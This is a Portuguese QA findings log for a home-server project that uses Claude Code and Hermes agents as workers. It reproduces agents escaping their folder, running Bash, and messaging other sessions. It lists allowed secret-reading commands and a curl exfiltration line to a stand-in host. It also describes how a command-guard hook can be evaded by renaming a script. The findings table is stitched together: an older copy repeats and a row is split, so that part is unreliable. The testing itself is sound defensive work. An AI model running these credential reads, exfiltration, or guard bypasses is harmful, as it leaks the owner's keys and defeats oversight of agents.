# Achados da QA

Dono: QA (sessão Claude "A13 home server architecture reengineering"). Só entra aqui o que tem reprodução.
Gravidade: CRÍTICA (execução ou vazamento de segredo sem interação), ALTA, MÉDIA, BAIXA.
Estado: ABERTO · CORRIGIDO (o dono aplicou a correção) · VERIFICADO (a QA testou de novo e passou).

| ID | Gravidade | Onde | Resumo | Dono | Estado |
|---|---|---|---|---|---|
| Q1 | CRÍTICA | `tools/worker/worker.mjs` (1.0, perfil pc-claude) | Sem `--permission-mode`, o Claude Code 2.1.303 aprova sozinho: o agente do PC rodou Bash e leu arquivos fora da pasta | ORQ | VERIFICADO (1.1) |
| Q2 | ALTA | `tools/worker/worker.mjs` (1.0, perfil pc-hermes) | Hermes com toolsets padrão (terminal, file, code_execution, computer_use, cronjob) e sem aprovação para comandos comuns | ORQ | VERIFICADO (desligado no 1.1; T22) |
| Q3 | ALTA | `tools/worker/worker.mjs` (1.1) | Mesmo em `dontAsk`, o agente tinha SendMessage, ListAgents, RemoteTrigger, PushNotification e Cron*: mandou mensagem para outra sessão do Claude | ORQ | VERIFICADO (1.2) |
| R1 | BAIXA | `tools/worker/worker.mjs` (1.1) | workdir dentro de pasta bloqueada (~/AppData etc.): o agente não lia nem a própria pasta e devolvia ok:true | ORQ | VERIFICADO (1.2: exit 2) |
| R2 | BAIXA | `tools/worker/test/` | `node --test <pasta>` falha no Node 25 do Windows; por glob passa | ORQ | VERIFICADO (comando documentado) |
| Q4 | BAIXA | `server/termux/egress-proxy.mjs:38` | Erro do destino depois do túnel aberto escreve `HTTP/1.1 502` dentro do fluxo TLS; e importar o módulo já abre a porta, o que impede teste de `allowed()` | ORQ | VERIFICADO no PC (`b8d64a6`, 4/4); falta conferir no A13 depois do deploy |
| Q5 | MÉDIA | `tools/rescue/desenhar_padrao.bat:15`, `tools/rescue/resgatar_galaxy_a21s.bat:4` | Lançadores de resgate QUEBRADOS: chamam .py/.ps1 em `C:UsersRyanrDesktop`, que foram movidos para `tools/rescue/` (não existem mais na Desktop). Mais caminho da Desktop e serial fixo em `tools/debug/*.cjs` e `tools/connect/legacy` | GEM-IDE | VERIFICADO pela QA (19/10 ~10:00): `.bat` com `%~dp0` (lidos, não executados: mandariam toques ao aparelho); regressão com 0 ocorrências. Correções do GEM-IDE ainda SEM COMMIT no git |
| R3 | BAIXA | `server/agentops/adapters.mjs:26` | `startsWith(AGENTS_ROOT + "/")` não é portátil: no Windows o teste de confinamento (`agentops.test.mjs:191`) falha, 14/15; no A13 passa. Sugerido `relative()` + `isAbsolute()` | ORQ | VERIFICADO (15/15 no PC, 19/10 06:5x) |
| Q6 | BAIXA | `tools/server/backup.sh:37-38,51-53` | O backup não leva `var/service/egress` (lista parou em server-box, alertas, agentops e sftp). A recuperação não quebra: o DISASTER_RECOVERY manda rodar o `deploy.ps1` depois, e ele recria o egress pelo `setup.sh:20`. Mas a lista e a conferência do backup estão desatualizadas | ORQ | ABERTO |
| Q7 | MÉDIA | `server/agentops/adapters.mjs` (claude-local, A13) | Usa `dontAsk` + `allowedTools`, sem `--tools` nem `--strict-mcp-config`. Com os mesmos argumentos no PC (mesma versão 2.1.303), o `init` traz Bash, Write, WebFetch, SendMessage, ListAgents, RemoteTrigger, PushNotification, Cron* e os conectores do claude.ai da conta (Gmail, Calendar, Shopify…). O `dontAsk` NEGA as MCP (Context7 negado, testado) e o Bash, mas ferramentas que não pedem permissão passam (SendMessage/ListAgents provados no Q3). O A13 usa a mesma conta Pro | ORQ | VERIFICADO (T32, 2a14bb8: --tools por perfil + --restricted + --settings + --strict-mcp-config; 16/16; init no A13 pela ORQ) |
| R4 | BAIXA | `tools/server/backup-agendado.sh` | Sempre sai com o código do `mv` final: backup que falha aparece como "Last Result 0" no Agendador (só o vigia de 8 dias avisaria) | ORQ | CORRIGIDO pela ORQ (2a14bb8), lido pela QA |
| R5 | BAIXA | `tools/server/backup-agendado.sh` | O backup de domingo entra no A13 sem olhar `.collab/locks/a13-servidor.lock` (pode cruzar com um deploy) | ORQ | CORRIGIDO pela ORQ (2a14bb8), lido pela QA |
| R6 | BAIXA | `server/termux/claude-update.sh` (`--apply [versão]`) | CORRIGIDO pela ORQ (2a14bb8), lido pela QA |

Dono: QA (sessão Claude "A13 home server architecture reengineering"). Só entra aqui o que tem reprodução.
Gravidade: CRÍTICA (execução ou vazamento de segredo sem interação), ALTA, MÉDIA, BAIXA.
Estado: ABERTO · CORRIGIDO (o dono aplicou a correção) · VERIFICADO (a QA testou de novo e passou).

| ID | Gravidade | Onde | Resumo | Dono | Estado |
|---|---|---|---|---|---|
| Q1 | CRÍTICA | `tools/worker/worker.mjs` (1.0, perfil pc-claude) | Sem `--permission-mode`, o Claude Code 2.1.303 aprova sozinho: o agente do PC rodou Bash e leu arquivos fora da pasta | ORQ | VERIFICADO (1.1) |
| Q2 | ALTA | `tools/worker/worker.mjs` (1.0, perfil pc-hermes) | Hermes com toolsets padrão (terminal, file, code_execution, computer_use, cronjob) e sem aprovação para comandos comuns | ORQ | VERIFICADO (desligado no 1.1; T22) |
| Q3 | ALTA | `tools/worker/worker.mjs` (1.1) | Mesmo em `dontAsk`, o agente tinha SendMessage, ListAgents, RemoteTrigger, PushNotification e Cron*: mandou mensagem para outra sessão do Claude | ORQ | VERIFICADO (1.2) |
| R1 | BAIXA | `tools/worker/worker.mjs` (1.1) | workdir dentro de pasta bloqueada (~/AppData etc.): o agente não lia nem a própria pasta e devolvia ok:true | ORQ | VERIFICADO (1.2: exit 2) |
| R2 | BAIXA | `tools/worker/test/` | `node --test <pasta>` falha no Node 25 do Windows; por glob passa | ORQ | VERIFICADO (comando documentado) |
| Q4 | BAIXA | `server/termux/egress-proxy.mjs:38` | Erro do destino depois do túnel aberto escreve `HTTP/1.1 502` dentro do fluxo TLS; e importar o módulo já abre a porta, o que impede teste de `allowed()` | ORQ | VERIFICADO no PC (`b8d64a6`, 4/4); falta conferir no A13 depois do deploy |
| Q5 | MÉDIA | `tools/rescue/desenhar_padrao.bat:15`, `tools/rescue/resgatar_galaxy_a21s.bat:4` | Lançadores de resgate QUEBRADOS: chamam .py/.ps1 em `C:UsersRyanrDesktop`, que foram movidos para `tools/rescue/` (não existem mais na Desktop). Mais caminho da Desktop e serial fixo em `tools/debug/*.cjs` e `tools/connect/legacy` | GEM-IDE | ABERTO (handoff `2026-10-19_qa-para-gemini_caminhos-desktop.md`) |
| R3 | BAIXA | `server/agentops/adapters.mjs:26` | `startsWith(AGENTS_ROOT + "/")` não é portátil: no Windows o teste de confinamento (`agentops.test.mjs:191`) falha, 14/15; no A13 passa. Sugerido `relative()` + `isAbsolute()` | ORQ | VERIFICADO (15/15 no PC, 19/10 06:5x) |
. Depois de cada atualização, repetir o teste de isolamento (as ferramentas mudam entre versões) | ORQ | ABERTO |
| R7 | BAIXA | `tools/server/reaplicar-ajustes.ps1:2` | Serial fixo `RQ8TC00EJNB` no `param` (regra do CLAUDE.md); ler do perfil com `Get-ProfileBySerial`/`profiles/a13.json` | ORQ | VERIFICADO (regressão não acusa mais o reaplicar-ajustes.ps1) |
| Q8 | MÉDIA | `server/termux/setup.sh:7` | Instala `nodejs-lts`, mas a produção roda `nodejs` 26.4.0 (dpkg e `/proc/<pid>/exe` de todos os serviços). No Termux os dois conflitam: `deploy.ps1 -Step Install` ou a reconstrução do DISASTER_RECOVERY trocariam a versão principal do Node, diferente da testada. O `docs/ARCHITECTURE.md:16` e o `profiles/a13.json:29` dizem v24.18.0 (falso; ver `docs/qa/AFIRMACOES.md`) | ORQ (+ GEM-IDE no perfil) | VERIFICADO no setup (T33: `nodejs`); textos do ARCHITECTURE/perfil pendentes |
| R8 | BAIXA | `server/agentops/adapters.mjs` (`claudeArgs`) | Texto da tarefa vai como argumento posicional depois de `-p` (booleano): texto que começa com "-" vira opção do CLI (`claude -p "--version"` imprime a versão). Com os argumentos da T32 e stdin vazio: `--dangerously-skip-permissions` → recusado pelo `--restricted`; `-c` → erro. Sem escalada hoje, mas tarefa legítima com "-" no início quebra. Sugerido: texto pelo stdin | ORQ | VERIFICADO (T34, 73d3a2d: texto pelo stdin; teste garante que depois de `-p` vem opção nossa; 16/16) |
| Q9 | BAIXA | `server/panel/server-box/console-api.mjs:21,84` | Respostas da `/api/v1/*` saem sem `X-Content-Type-Options: nosniff` (e sem `X-Frame-Options`); os outros JSON do `server.js` têm (`SEC_HEADERS`). Risco prático pequeno (exige login, tipo `application/json` explícito), mas é inconsistente | BACK | ABERTO |
| Q10 | MÉDIA | `.claude/hooks/adb-guard.mjs:9-18` (5bc2bd3) | A trava só lê o TEXTO do comando: (1) `adb shell settings put ...` passa (o CLAUDE.md manda confirmar); (2) `./tools/debug/aplicar_tweaks_ocultos.ps1` passa, pois não contém "adb", e é justo o script da T40 (dex2oat, DPI, imersivo); (3) o marcador `# OK-RYAN:` pode ser escrito por qualquer sessão, então prova convenção, não aprovação; `am force-stop` também passa. Testado: 8 casos, 3/3 do teste dela ok | CHEFE | VERIFICADO (2558bfd: trava bloqueia a execução dos scripts de tools/debug e tools/rescue, 9/10 casos meus ok, 4/4 dela; `settings put` liberado de propósito. Furo residual aceito: copiar o script para outro nome e executar a cópia) |

## Q1: worker do PC executava Bash e lia fora da pasta

- **Fronteira de confiança:** a tarefa nasce na fila do A13 (token admin ou console do painel). O A13 é o lado menos confiável: todos os serviços rodam com o mesmo usuário e os tokens ficam legíveis por ele. O PC guarda `~/.servidor-a13/backup.key`, o token do worker e `~/.ssh/id_ed25519`.
- **Reprodução (19/10 ~01:33):** com os argumentos do 1.0 (`claude -p --output-format json --allowedTools Read,Grep,Glob --max-turns N`, prompt pelo stdin) numa pasta temporária, o pedido "leia <arquivo fora da pasta> e rode `echo BASH_RODOU`" voltou com "O arquivo contém `CANARIO_218115861` e o Bash imprimiu `BASH_RODOU`", e `permission_denials` veio vazio.
- **Causa:** sem `--permission-mode`, vale o modo padrão do Claude Code 2.1.303, que aprova sozinho o que o classificador acha seguro. E `Read` sem caminho vale para o disco inteiro.
- **Controle no harness:** a cópia do 1.0 (no scratchpad da QA, com uma única mudança: aceitar `WORKER_CONFIG`) **reprovou nas 4 provas**: vazou o canário de fora, vazou o `.env` da pasta e rodou `printf <sal> | sha256sum` (o hash bateu). Só o `node -e writeFileSync` foi barrado pelo classificador.

## Q2: Hermes sem confinamento

- `hermes tools list`: ligados no CLI web, browser, terminal, file, code_execution, computer_use, cronjob, delegation e memory.
- `hermes approvals test` (avalia os guardas reais sem executar) dá "allow, would run without a prompt" para: `type C:\Users\Ryanr\.servidor-a13\backup.key`, `cat ~/.ssh/id_ed25519`, `curl -X POST -d @…/worker.json http://exemplo.invalid` e `schtasks /create … /sc onlogon`.
- Não existe toolset só de leitura com pasta confinada. Decisão do ORQ: pc-hermes desligado no worker até haver prova (T22).

## Q3: ferramentas de coordenação no agente do PC

- No 1.1, o evento `init` do Claude Code (`--output-format stream-json --verbose`) listava, além de Read, Grep e Glob: CronCreate, CronDelete, CronList, DesignSync, EnterWorktree, ExitWorktree, ListAgents, Monitor, PushNotification, RemoteTrigger, ReportFindings, ScheduleWakeup, SendMessage, Skill, TaskStop e ToolSearch.
- **Reprodução:** com o `buildRunner`/`prepareDir` do 1.1, o agente rodou `ListAgents` (listou as 5 sessões do PC) e `SendMessage` para esta sessão, com retorno `success:true` e `permission_denials` vazio. Impacto: uma tarefa do A13 conseguiria mandar instruções para as sessões do Claude Desktop, que rodam em modo bypass.
- **Correção testada antes de aplicar:** `--tools Read,Grep,Glob --restricted --settings <pasta>/.claude/settings.json`.
- **Armadilha provada:** `--restricted` ignora o `.claude/settings.json` da pasta. Sem `--settings`, o `.env` da pasta vazou; com `--settings`, veio "File is in a directory that is denied by your permission settings".

## Verificação do worker 1.2 (`251b830`, sha256 `d438b052…`), 19/10 ~01:58

`node tools/qa/worker-canario.mjs`: o worker real via `--once`, contra um AgentOps simulado em 127.0.0.1 (nunca o A13).

| Prova | Resultado |
|---|---|
| `init`: só Read/Grep/Glob/LS | Glob, Grep, Read |
| modo de permissão / servidores MCP | `dontAsk` / 0 |
| ler arquivo fora da pasta | tentado e negado (`permission_denials`: Read …\fora\config-notas.txt) |
| ler `dentro.txt` da pasta (prova de que o agente rodou) | ok |
| ler `.env` da pasta / terminal (sha256) / marcador | bloqueado / não rodou / não criado |
| pc-hermes | `ok:false` "desligado até prova de segurança" |
| workdir em ~/AppData | recusado na partida, exit 2 |
| `node --test tools/worker/test/*.test.mjs` | 7/7 |

**Limites do teste:** o isolamento é lógico (regras do Claude Code), não um sandbox do Windows. O harness não cobre um Claude Code de versão diferente: rode de novo depois de cada atualização do Claude Code no PC. O `SendMessage` do teste Q3 devolveu `success:true`, mas a mensagem não apareceu nesta sessão (pode ter ficado retida). A prova do Q3 é o retorno da ferramenta, não a chegada.

## Q4: egress-proxy (baixa)

`server/termux/egress-proxy.mjs`: o `upstream.on("error")` chama `client.end("HTTP/1.1 502 …")` mesmo depois do `200 Connection Established`. O cliente recebe texto no meio do TLS (falha de qualquer jeito, mas com erro confuso). Corrigir: escrever o 502 só antes do 200; depois dele, `client.destroy()`. Além disso, o `server.listen` roda no import, então não dá para testar `allowed()` (por exemplo, `evilanthropic.com` tem que dar falso) sem abrir a porta. Sugestão: proteger o `listen` como o worker 1.1 faz, e escrever um teste.

**Q4, revisão da correção (`b8d64a6`, 19/10 06:37):** o 502 só sai antes do `200` e, depois dele, `client.destroy()`; `allowed()` recusa `/` e `@`; `listen` atrás do mesmo guard de módulo principal que o `server/agentops/server.mjs:139` já usa em produção no runit. `node --test server/termux/test/*.test.mjs`: 4/4. **Conferir no A13 depois do deploy:** `sv status egress` com mais de 10 s de uptime (sem laço de reinício) e uma requisição pelo proxy para `api.anthropic.com` responde (se o guard falhasse, o node sairia na hora e o Claude Code do A13 ficaria sem rede).

## Regressão (T20)

`node tools/qa/regressao.mjs` (relatórios em `docs/qa/regressao-*.md`). 1ª rodada completa em 19/10 06:41: sintaxe 100% (15 JS, 18 shell, 9 PowerShell); suítes da raiz ok, exceto R3; painel `celular@e127952` 128/129 com 1 pulado em 6,5 s; nenhuma suíte travou (limite de 180 s); segredos: 0 na raiz (107 arquivos) e 0 no painel (49); regra de caminhos: 14 ocorrências (Q5).

## Reconstrução do zero (T20)

`node tools/qa/reconstrucao.mjs` (só no PC, nunca no A13). Rodado em 19/10 ~06:55 com `backups/a13-20261019-014310.tar.gz.enc` (5 h de idade): **19/19 passos**.
- sha256 confere; `backup.sh --restaurar` funciona; 20/20 arquivos essenciais; a fila `state.json` é JSON válido (5 tarefas).
- O painel renasce do bundle git do backup no commit de produção registrado (`c64a7f4` = `commit.txt`).
- O painel do bundle sobe no PC com HOME = pasta restaurada (só 127.0.0.1): `/health` 200; `/ready` 503 (esperado fora do A13, sem runit); `/api/v1/overview` 401 sem token e 200 com o `painel.token` restaurado; a resposta não contém nenhum dos tokens.
- O AgentOps do backup sobe com a fila restaurada (sem executar tarefas): `/health` 200; o token admin restaurado abre `/api/state` com 5 tarefas, igual ao arquivo; token errado dá 401; o painel restaurado lista os perfis do AgentOps restaurado.
- A pasta restaurada, com segredos, é apagada no fim (conferido).
- **Não coberto:** o passo 4 do DISASTER_RECOVERY (`deploy.ps1` num aparelho novo), porque exige um celular limpo; o `sshd` com as host keys restauradas; o vigia de alertas (de propósito: mandaria push).

## Revisões feitas pela QA (19/10)

| Tarefa | Veredito | Como conferi |
|---|---|---|
| T5 git local | aprovado | 112 arquivos rastreados, maior 31 KB (`docs/LOG.md`); nenhum binário ou segredo por extensão, nome ou conteúdo (regressão: 0 suspeitos); `git check-ignore` confirma backups/, assets/apk/, painel, snapshots e locks fora |
| T15 worker do PC | aprovado (1.2) | ver seções Q1 a Q3 |
| T18 backup semanal | aprovado com R4 e R5 | `schtasks /query`: semanal, domingo 10:00, último resultado 0 (01:43); log com sha256 ok, painel do bundle = produção, 206 arquivos; retenção só depois da prova de restauração (`set -e`). Próxima execução aparece como 25/10 09:00: é o fim do horário de verão nesse dia (informativo) |
| T24 atualizador do Claude Code | aprovado com R6 (e Q7 relacionado) | leitura do código: sha512 contra `dist.integrity`, `--version` antes da troca, troca atômica do link (`mv -fT`), anterior guardada, rollback. `--apply`/`--rollback` não foram exercitados (não há versão nova) |
| T29 permissões do Termux | aprovado | conferido por mim pelo ADB (lock 06:48, só leitura): em `dumpsys package com.termux`, só `android.permission.DUMP: granted=true` |
| T30 reaplicar ajustes | aprovado com R7 | `reaplicar-ajustes.ps1 -SoConferir` rodado por mim (mesmo lock): 5/5 ok, "tudo certo: nada a corrigir" |

## Segurança do painel, caixa-preta (19/10 ~06:56)

`node tools/qa/seguranca-painel.mjs`: `server.js` REAL de um clone limpo do branch `celular` (`f9ad723`, o que está no A13), em 127.0.0.1, com home falsa (token de TESTE gerado na hora) e AgentOps simulado que registra cada chamada. "Recusada" = código HTTP certo **e** nenhuma chamada no AgentOps. **40/41 provas**; a falha é o Q9.

| Grupo | O que passou |
|---|---|
| público | `/health` só `{ok, service}`; `/ready` só `{ok}` |
| sem login | 18 rotas de API dão 401; `/`, `/console`, `/status.html` e os scripts redirecionam para `/login` |
| credencial | Bearer errado, token na query string e token cru no cookie não autenticam |
| login | erro = 401 sem cookie; acerto = 303 + cookie `HttpOnly; SameSite=Strict; Path=/`, que não contém o token; corpo de 5 KB cortado |
| ações | sem `X-Painel-Acao`, com Origin de outro site, Origin `null`, cookie sem cabeçalho, sem login e GET na rota de ação: nada chega ao AgentOps; mesma origem + cabeçalho = exatamente 1 chamada |
| entrada | id de tarefa com `../` codificado recusado (400) sem alcançar outra rota do AgentOps; corpo de 20 KB cortado; JSON inválido = 400 |
| logs | 8 fontes forjadas recusadas (`file:../..`, `__proto__`, `constructor`, `sv:../`, caminhos absolutos); token do painel, Bearer e sk-ant mascarados no log |
| estáticos | 7 tentativas de sair de `public/` (`%2e%2e`, `%5c`, `//`…) não devolvem código-fonte |
| cabeçalhos | CSP do console com `script-src 'self'` (sem inline), `X-Frame-Options: DENY`, nosniff no HTML; `X-Request-Id` malicioso trocado por UUID |
| ao vivo | `/api/v1/live` 401 sem login; com login abre `text/event-stream` |
| sessão | "sair de todos" troca o salt; cookie antigo vira 401; Bearer continua |
| limite | mais de 30 ações por minuto dão 429 (25 passaram, 7 barradas, contando as anteriores) |
| força bruta | depois de 10 erros, até o token certo dá 429 |
| segredos | token ausente de 110 respostas |

**Não coberto:** XSS no navegador (o front usa `textContent`; os testes de DOM da FRONT cobrem); DNS rebinding (sem cookie nem token, o atacante cai no 401, pela leitura do código); DoS por conexões lentas; TLS (o painel é HTTP na LAN/Tailscale). Observação da leitura: o Bearer errado nas rotas de API não conta para o bloqueio de força bruta (só o `/login` conta). Com o token de 48+ caracteres aleatórios, isso não é atacável na prática.

## T35: notas da FRONT sobre as ferramentas da QA (19/10 ~07:00)
1. Regra da Desktop em `tools/qa/regras.mjs` (com teste `tools/qa/test/regras.test.mjs`, 2/2): agora pega também `$env:USERPROFILE\Desktop`, `$HOME/Desktop`, `${HOME}/Desktop`, `[Environment]::GetFolderPath('Desktop')` e `homedir()`/`expanduser`/`Path.home()` + "Desktop".
2. `reconstrucao.mjs`: apaga a pasta restaurada em SIGINT/SIGTERM/SIGHUP e, no início, apaga as `qa-reconstrucao-*` com mais de 10 min (taskkill /F e kill -9 não deixam limpar). Testado: uma sobra com data de 20 min foi apagada.
3. Avisos contados à parte: "18/18 passos · 1 aviso(s)" (o Q6 do egress).
Rodado de novo com o backup das 06:55: 18/18, painel restaurado = produção `f9ad723`, 6 tarefas na fila.
